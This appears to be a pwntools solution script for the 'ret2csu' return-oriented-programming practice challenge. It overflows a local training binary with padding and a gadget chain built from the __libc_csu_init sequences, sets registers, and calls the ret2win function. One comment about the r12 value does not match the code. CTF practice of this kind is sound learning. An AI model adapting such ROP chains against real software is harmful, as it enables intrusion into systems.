from pwn import *


target = process('./ret2csu')

## Redirect control to 0x40089a which are bunch of pops
## set rbx 0 and rbp 1
## for pointer set 0x400560 in r12
## set r15 as third arg 0xdeadcafebabebeef

gadget1 = p64(0x40089a)
gadget2 = p64(0x400880)
payload = "A"*40
payload += gadget1
payload += p64(0x0)
payload += p64(0x1)
payload += p64(0x600e38)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0xdeadcafebabebeef)
payload += gadget2
payload += p64(0x0) ##add rsp, 0x8 command, will move the stack down eight values and, thus, padding will be required
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x4007b1) #ret2win

target.sendline(payload)
print(target.recv())
